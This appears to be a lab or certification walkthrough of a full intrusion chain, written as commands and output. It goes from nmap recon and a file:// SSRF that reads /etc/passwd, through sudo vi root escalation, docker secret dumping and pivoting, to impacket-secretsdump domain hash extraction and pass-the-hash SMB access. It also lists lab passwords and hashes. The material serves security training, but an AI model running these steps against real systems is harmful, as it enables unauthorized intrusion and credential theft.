# 1 Reconn

**Nmap scans**

```
                                                                                                       
┌──(sreecharan㉿kali)-[~]
└─$ nmap -sn 172.26.10.0/24  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 15:37 +0530
Nmap scan report for 172.26.10.1
Host is up (0.29s latency).
Nmap scan report for 172.26.10.11
Host is up (0.30s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 19.51 seconds

```

**Now enumerate 172.26.10.11:**

```
┌──(sreecharan㉿kali)-[~]
└─$ nmap -sV -sC -p- -T4 172.26.10.11 --min-rate 5000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 15:45 +0530
Warning: 172.26.10.11 giving up on port because retransmission cap hit (6).
Nmap scan report for 172.26.10.11
Host is up (0.50s latency).
Not shown: 62343 closed tcp ports (reset), 3189 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 32:fb:39:22:8d:0a:cf:1c:a9:01:0b:dd:d6:c9:84:04 (ECDSA)
|_  256 8e:b4:48:f5:1c:f8:39:54:d9:a6:e6:58:87:a7:0d:a4 (ED25519)
8091/tcp  open  http    Node.js Express framework
|_http-title: HotHost
23100/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.22)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/3.1.3 Python/3.9.22
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.39 seconds
```

Let's enumerate 23100 port and see what it is running.

1. I have tried CURL on the ip to see whats the response
```
                                                                                                      
┌──(sreecharan㉿kali)-[~]
└─$ curl -i http://172.26.10.11:23100/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.22
Date: Fri, 24 Jul 2026 10:18:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 152
Connection: close

Access denied. Only the /fetch route with 'url' parameter is allowed. Example: /fetch?url=file:///<location>, To Access Host files go with 'hostfs' path                                                                                       
```
2. let's try the hint
```
┌──(sreecharan㉿kali)-[~]
└─$ curl "http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
                                   
```

*Note:* I found app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash
        USERNAME: app-admin
        passwd: @dmin@123
Used for SSH



Let's try SSH using these cred:

```
app-admin@app-server:~$ sudo -l
[sudo] password for app-admin: 
Matching Defaults entries for app-admin on app-server:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User app-admin may run the following commands on app-server:
    (ALL) /usr/bin/vi
```

This tells there is a chance for priv Escalation (root via GTFOBins)
AND

```
app-admin@app-server:~$ systemctl list-units --type=service --state=running
  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                       >
  containerd.service          loaded active running containerd container runtime
  cron.service                loaded active running Regular background program processing daemon
  dbus.service                loaded active running D-Bus System Message Bus
  docker.service              loaded active running Docker Application Container Engine
  getty@tty1.service          loaded active running Getty on tty1
  ModemManager.service        loaded active running Modem Manager
  multipathd.service          loaded active running Device-Mapper Multipath Device Controller
  open-vm-tools.service       loaded active running Service for virtual machines hosted on VMware
  polkit.service              loaded active running Authorization Manager
  rsyslog.service             loaded active running System Logging Service
  ssh.service                 loaded active running OpenBSD Secure Shell server
  systemd-journald.service    loaded active running Journal Service
  systemd-logind.service      loaded active running User Login Management
  systemd-networkd.service    loaded active running Network Configuration
  systemd-resolved.service    loaded active running Network Name Resolution
  systemd-timesyncd.service   loaded active running Network Time Synchronization
  systemd-udevd.service       loaded active running Rule-based Manager for Device Events and Files
  udisks2.service             loaded active running Disk Manager
  unattended-upgrades.service loaded active running Unattended Upgrades Shutdown
  upower.service              loaded active running Daemon for power management
  user@0.service              loaded active running User Manager for UID 0
  user@1000.service           loaded active running User Manager for UID 1000
  vgauth.service              loaded active running Authentication service for virtual machines hosted>

Legend: LOAD   → Reflects whether the unit definition was properly loaded.
        ACTIVE → The high-level unit activation state, i.e. generalization of SUB.
        SUB    → The low-level unit activation state, values depend on unit type.

23 loaded units listed.
```
This tells there is a docker running maybe for the 2 applications
```
app-admin@app-server:~$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.45/containers/json": dial unix /var/run/docker.sock: connect: permission denied
```
We need root to access this...

# 2 Privilege Escalation

Exploiting vuln
```
app-admin@app-server:~$ sudo vi -c ':!/bin/bash'

root@app-server:/home/app-admin# id
uid=0(root) gid=0(root) groups=0(root)
root@app-server:/home/app-admin# whoami
root
```

Now let's try docker again
```
root@app-server:/home/app-admin# docker ps -a
CONTAINER ID   IMAGE             COMMAND                   CREATED         STATUS                       PORTS                                           NAMES
c3f1b125bc1d   code              "python3 code.py"         13 months ago   Up 13 months                 0.0.0.0:23100->23100/tcp, :::23100->23100/tcp   code-testx
a73c06668e69   my-hothost:leak   "node src/index.js"       13 months ago   Up 13 months                 0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       hot_1
dcbd090cb235   code              "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   code-test8
c1afed8135b1   code              "python3 code.py"         14 months ago   Exited (255) 14 months ago   0.0.0.0:23100->23100/tcp, :::23100->23100/tcp   code-test11
71d3c4d534f9   code              "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   code-test10
49792c71b3c1   my-hothost:leak   "node src/index.js"       14 months ago   Exited (137) 14 months ago                                                   hot
cbfc88df578e   95f80ec60c06      "node src/index.js"       14 months ago   Exited (137) 14 months ago                                                   hothost-web1
8c9b9fc8a67d   f4f0580887b2      "node src/index.js"       14 months ago   Exited (137) 13 months ago                                                   hothost-web
63f2da1bcfd6   f4f0580887b2      "node src/index.js"       14 months ago   Exited (1) 14 months ago                                                     suspicious_ptolemy
dbfe85340aa8   8ced2d0b80b5      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   co1de-test
0a4b1f1e4b7e   8ced2d0b80b5      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   code-apple
8b9b91719703   ebe56dc4be06      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   code-container
c99628067a55   10c386f9f779      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   c12
c0385e7eba24   10c386f9f779      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   c1
a5eaa13ef93b   69cf2895734c      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   code-test1
2dbbb8977077   ed2543229f51      "python3 code.py"         14 months ago   Exited (137) 14 months ago                                                   code-test
9c17693bfbc8   60aae044ebb0      "/bin/sh -c 'sh -c \"…"   14 months ago   Exited (137) 14 months ago                                                   focused_keller
2e1b51084971   60aae044ebb0      "/bin/sh -c 'sh -c \"…"   14 months ago   Exited (255) 14 months ago                                                   wonderful_hugle
289cd7f9c62f   278892ab3f57      "node src/index.js"       14 months ago   Exited (255) 14 months ago   0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       web3
1966cbf6f0e9   fb77885801d3      "node src/index.js"       14 months ago   Exited (255) 14 months ago   0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       web2
0e14fdd01284   bc817e9f85b7      "sh"                      14 months ago   Exited (0) 14 months ago                                                     kind_sanderson
9fe9c120f695   bc817e9f85b7      "node src/index.js"       14 months ago   Exited (137) 14 months ago                                                   web1
80a14ab1994f   e1fcbcebf122      "node src/index.js"       14 months ago   Exited (137) 14 months ago                                                   web
efd661f35cd3   e1fcbcebf122      "node src/index.js"       14 months ago   Exited (1) 14 months ago                                                     loving_wescoff
51e051aedd24   e1fcbcebf122      "."                       14 months ago   Created                                                                      nervous_mcnulty
44071ad36b49   e1fcbcebf122      "node src/index.js"       14 months ago   Exited (1) 14 months ago                                                     heuristic_chatelet
00f1dd456da6   74cc54e27dc4      "/hello"                  14 months ago   Exited (0) 14 months ago                                                     kind_robinson
root@app-server:/home/app-admin# 
```
checking the files in docker
```
root@app-server:/home/app-admin# docker ps
CONTAINER ID   IMAGE             COMMAND               CREATED         STATUS         PORTS                                           NAMES
c3f1b125bc1d   code              "python3 code.py"     13 months ago   Up 13 months   0.0.0.0:23100->23100/tcp, :::23100->23100/tcp   code-testx
a73c06668e69   my-hothost:leak   "node src/index.js"   13 months ago   Up 13 months   0.0.0.0:8091->8091/tcp, :::8091->8091/tcp       hot_1

```

```
root@app-server:/home/app-admin# docker exec -it a73c06668e69 sh
/code # cat /hothost.json
cat: can't open '/hothost.json': No such file or directory
/code # cat src/env.js
import { v4 as uuidv4 } from 'uuid';
import path from "path";
import fs from "fs";
const env = {
    ENV: process.env.ENV || 'production',
    WEB_ADMIN_USERNAME: process.env.HOTHOST_WEB_ADMIN_USERNAME,
    WEB_ADMIN_PASSWORD: process.env.HOTHOST_WEB_ADMIN_PASSWORD,
    WEB_BASIC_PUBLIC_USERNAME: process.env.HOTHOST_WEB_BASIC_PUBLIC_USERNAME,
    WEB_BASIC_PUBLIC_PASSWORD: process.env.HOTHOST_WEB_BASIC_PUBLIC_PASSWORD,
    WEB_PORT: +process.env.HOTHOST_WEB_PORT,
    WEB_JWT_SECRET: process.env.HOTHOST_WEB_JWT_SECRET,
    WEB_PUBLIC_VIEW_ENABLED: process.env.HOTHOST_WEB_PUBLIC_VIEW_ENABLED === 'true',
};
env.DATA_PATH = env.ENV === 'local' ? './data/' : '/var/lib/hothost/data/';
env.THIRD_PARTY_PLUGINS_LOCATION = path.join(env.DATA_PATH, 'plugins');
if (env.ENV === 'production') {
    const requiredVariables = ['HOTHOST_WEB_ADMIN_USERNAME', 'HOTHOST_WEB_ADMIN_PASSWORD',];
    requiredVariables.forEach(key => {
        if (!process.env[key]) {
            throw new Error(`Environment variable '${key}' is missing`);
        }
    });
    if (!env.WEB_JWT_SECRET) {
        const jwtSecretPath = path.join('/var/lib/hothost/jwt');
        if (!fs.existsSync(jwtSecretPath)) {
            const jwtSecret = uuidv4();
            fs.writeFileSync(jwtSecretPath, jwtSecret);
        }
        env.WEB_JWT_SECRET = fs.readFileSync(jwtSecretPath);
    }
} else {
    if (!fs.existsSync(env.DATA_PATH)) {
        fs.mkdirSync(env.DATA_PATH);
    }
    env.WEB_ADMIN_USERNAME ||= 'admin';
    env.WEB_ADMIN_PASSWORD ||= '123456';
    env.WEB_BASIC_PUBLIC_USERNAME ||= 'admin';
    env.WEB_BASIC_PUBLIC_PASSWORD ||= '123456';
    env.WEB_PORT ||= '8007';
    env.WEB_JWT_SECRET ||= 'e10adc3949ba59abbe56e057f20f883e';
}
export default env;/code # cat src/database.js
import path from 'path';
import { JSONFile, Low } from 'lowdb';
import env from './env.js';
const filePath = path.join(env.DATA_PATH, 'hothost.json');
const adapter = new JSONFile(filePath);
const db = new Low(adapter);
const _read = db.read.bind(db);
db.read = async function () {
    await _read();
    if (!db.data) {
        db.data = {};
    }
    db.data.users ||= [];
    db.data.monitoringData ||= [];
    db.data.httpMonitoringData ||= [];
    db.data.settings ||= {
        RAM_THRESHOLD: 90,
        RAM_STABILIZATION_LEVEL: 3,
        DISK_THRESHOLD: 90,
        DISK_STABILIZATION_LEVEL: 1,
        HOST_IS_DOWN_CONFIRMATIONS: 1,
        HTTP_ISSUE_CONFIRMATION: 1,
        DAYS_FOR_SSL_EXPIRED: 14,
        HOURS_FOR_NEXT_ALERT: 12,
    };
    db.data.pluginSettings ||= [];
};
export default db;/code # cat .env 2>/dev/null
/code # find . -iname "*.env*"


/code # env | grep -i hothost
HOTHOST_WEB_ADMIN_PASSWORD=Very3stroungPassword
HOTHOST_WEB_PUBLIC_VIEW_ENABLED=false
HOTHOST_WEB_ADMIN_USERNAME=admin
HOTHOST_WEB_PORT=8091
/code # find / -iname "hothost.json" 2>/dev/null
/var/lib/hothost/data/hothost.json
/code # cat /var/lib/hothost/data/hothost.json
{
  "users": [
    {
      "id": "07643590-1aea-4de3-91ec-8881600cc54c",
      "username": "admin",
      "password": "665a26fad71ea9ef3edf5f33195d4b31",
      "createdAt": "Mon May 12 2025"
    }
  ],
  "monitoringData": [],
  "httpMonitoringData": [],
  "settings": {
    "RAM_THRESHOLD": 90,
    "RAM_STABILIZATION_LEVEL": 3,
    "DISK_THRESHOLD": 90,
    "DISK_STABILIZATION_LEVEL": 1,
    "HOST_IS_DOWN_CONFIRMATIONS": 1,
    "HTTP_ISSUE_CONFIRMATION": 1,
    "DAYS_FOR_SSL_EXPIRED": 14,
    "HOURS_FOR_NEXT_ALERT": 12
  },
  "pluginSettings": []
}/code # 

```
We found the cred:
"username": "admin",
PASSWORD=Very3stroungPassword


After exiting the docker file,
```
root@app-server:/home/app-admin# cat /var/log/auth.log | grep "Accepted"
2026-07-24T06:30:08.388912+00:00 app-server sshd[2970]: Accepted password for app-admin from 10.10.10.20 port 40694 ssh2
2026-07-24T06:30:38.459492+00:00 app-server sshd[3148]: Accepted password for app-admin from 10.10.10.20 port 55242 ssh2
2026-07-24T06:31:08.530555+00:00 app-server sshd[3207]: Accepted password for app-admin from 10.10.10.20 port 50758 ssh2
2026-07-24T06:31:38.599614+00:00 app-server sshd[3280]: Accepted password for app-admin from 10.10.10.20 port 57046 ssh2
2026-07-24T06:32:08.669766+00:00 app-server sshd[3362]: Accepted password for app-admin from 10.10.10.20 port 44184 ssh2
2026-07-24T06:32:38.738539+00:00 app-server sshd[3435]: Accepted password for app-admin from 10.10.10.20 port 41728 ssh2
2026-07-24T06:33:08.807825+00:00 app-server sshd[3508]: Accepted password for app-admin from 10.10.10.20 port 47912 ssh2
2026-07-24T06:33:38.876463+00:00 app-server sshd[3590]: Accepted password for app-admin from 10.10.10.20 port 54054 ssh2
2026-07-24T06:34:08.946726+00:00 app-server sshd[3665]: Accepted password for app-admin from 10.10.10.20 port 33712 ssh2
2026-07-24T06:34:39.017372+00:00 app-server sshd[3738]: Accepted password for app-admin from 10.10.10.20 port 40748 ssh2
2026-07-24T06:35:09.086571+00:00 app-server sshd[3823]: Accepted password for app-admin from 10.10.10.20 port 57810 ssh2
2026-07-24T06:35:39.156433+00:00 app-server sshd[3900]: Accepted password for app-admin from 10.10.10.20 port 43294 ssh2
2026-07-24T06:36:09.226505+00:00 app-server sshd[3975]: Accepted password for app-admin from 10.10.10.20 port 45484 ssh2
2026-07-24T06:36:39.295426+00:00 app-server sshd[4058]: Accepted password for app-admin from 10.10.10.20 port 36758 ssh2
2026-07-24T06:37:09.364429+00:00 app-server sshd[4131]: Accepted password for app-admin from 10.10.10.20 port 39172 ssh2
2026-07-24T06:37:39.434393+00:00 app-server sshd[4206]: Accepted password for app-admin from 10.10.10.20 port 58266 ssh2
2026-07-24T06:38:09.505182+00:00 app-server sshd[4288]: Accepted password for app-admin from 10.10.10.20 port 33458 ssh2
2026-07-24T06:38:39.575665+00:00 app-server sshd[4361]: Accepted password for app-admin from 10.10.10.20 port 37996 ssh2
2026-07-24T06:39:09.644419+00:00 app-server sshd[4468]: Accepted password for app-admin from 10.10.10.20 port 38818 ssh2
2026-07-24T06:39:39.714588+00:00 app-server sshd[4551]: Accepted password for app-admin from 10.10.10.20 port 33690 ssh2
2026-07-24T06:40:09.786494+00:00 app-server sshd[4626]: Accepted password for app-admin from 10.10.10.20 port 33016 ssh2
2026-07-24T06:40:39.858358+00:00 app-server sshd[4699]: Accepted password for app-admin from 10.10.10.20 port 54384 ssh2
2026-07-24T06:41:09.931500+00:00 app-server sshd[4784]: Accepted password for app-admin from 10.10.10.20 port 53324 ssh2
Got such a very long output Any idea what to do next??
```

We have discovered a new IP...


Lets do nmap
*note:* you have to use proxychains to use nmap
```
                                                                                                                                                 
┌──(sreecharan㉿kali)-[~]
└─$ proxychains4 nmap -sV -p- 10.10.10.20 --min-rate 3000
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 17:10 +0530
Nmap scan report for 10.10.10.20
Host is up (0.61s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE       VERSION
80/tcp   open     http          Apache httpd 2.4.58 ((Ubuntu))
3389/tcp filtered ms-wbt-server
4369/tcp open     epmd          Erlang Port Mapper Daemon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.49 seconds
```
Gobuster
```
─(sreecharan㉿kali)-[~]
└─$ proxychains4 gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/dirb/common.txt
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.20
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
index.html           (Status: 200) [Size: 10730]
info.php             (Status: 200) [Size: 86966]
server-status        (Status: 403) [Size: 276]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
==============================================
```
We will get a endpoint /elfinder

do manual searching you will find AD_Resources.txt file,which has:

```
#Active Directory Sync Service Credentials:

Purpose: Password synchronization between on-prem AD and cloud services (Azure AD Connect).
Service Account: sync_user@ent.corp
Password: Summer@2025

#Security Notes:
  Syncs password hashes to Azure AD (if hybrid environment).
  Critical: Restrict to least privilege (e.g., deny interactive login).
```

**CRITICAL**
Service Account: sync_user@ent.corp
Password: Summer@2025

**Setup ligolo to access 10.10.10.20**

will use nmap to scan 10.10.10.0/24
```
                                                                                                                                              
┌──(sreecharan㉿kali)-[~]
└─$ nmap -sT -Pn -p 53,88,389,445,636,3268 10.10.10.0/24 --open
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 18:30 +0530
Nmap scan report for 10.10.10.1
Host is up (0.47s latency).
Not shown: 5 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 10.10.10.100
Host is up (0.30s latency).

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP

Nmap done: 256 IP addresses (256 hosts up) scanned in 205.97 seconds
```
this is the ip of domain controller

Use impacket-secretsdump to extract hashes.

```
                                                                                                                                                 
┌──(sreecharan㉿kali)-[~]
└─$ impacket-secretsdump ent.corp/sync_user:'Summer@2025'@10.10.10.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36405f88da713c31bbff52e57aea1f86:::
ent.corp\sync_user:1103:aad3b435b51404eeaad3b435b51404ee:e58b89915ba50f299b4bb10325894f91:::
ENT-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31fbe50b9b3af685a51d8a7c7d0977fe:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:992f0f89c2eec235f94d01103043a3626f1a54e5adc45280ebe58d0883dc294e
Administrator:aes128-cts-hmac-sha1-96:c3c88d0395d8c7e93039108279fa3cb9
Administrator:des-cbc-md5:ad9de62585018c5b
krbtgt:aes256-cts-hmac-sha1-96:1b161ecb048ed49498658525fea07d4278aeab4c8d60ee32e6a61392d14ec924
krbtgt:aes128-cts-hmac-sha1-96:61a3167db44973b38e6ea0ddb9f3f07d
krbtgt:des-cbc-md5:37ad9e49e3ea0b52
ent.corp\sync_user:aes256-cts-hmac-sha1-96:73ae7f5121e08ef5224bf82c941db87bf14ce5bf0bc3c0805b95485885db511f
ent.corp\sync_user:aes128-cts-hmac-sha1-96:72f6b128b62adb5cf0347e8655f41afc
ent.corp\sync_user:des-cbc-md5:377615f8b9106445
ENT-DC$:aes256-cts-hmac-sha1-96:cbda1d0c62141413ebcd2968fc749980704de38fa1fa36985b93e62b9b01fe9c
ENT-DC$:aes128-cts-hmac-sha1-96:3a9d2da90d7082d4cdced519679bd7f6
ENT-DC$:des-cbc-md5:31abecb951d662cb
[*] Cleaning up... 
```

Now lets get into the machine
```
                                                                                                                                               
┌──(sreecharan㉿kali)-[~/Desktop/CRTA]
└─$ smbclient //10.10.10.100/C$ -U 'Administrator' --pw-nt-hash 3d15cb1141d579823f8bb08f1f23e316
Try "help" to get a list of possible commands.
smb: \> ls
```

secret.xml.txt:
```
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Mon May 19 17:27:37 2025
  ..                                  D        0  Mon Jun  2 14:22:57 2025
  desktop.ini                       AHS      282  Wed Apr 30 03:35:21 2025
  secret.xml.txt                      A     1553  Mon May 19 17:32:46 2025

```

get the file into kali using
```
smb: \Users\Administrator\Desktop\> get secret.xml.txt
smb: \Users\Administrator\Desktop\> exit
```
In the same directory
```
cat secret.xml.txt
```
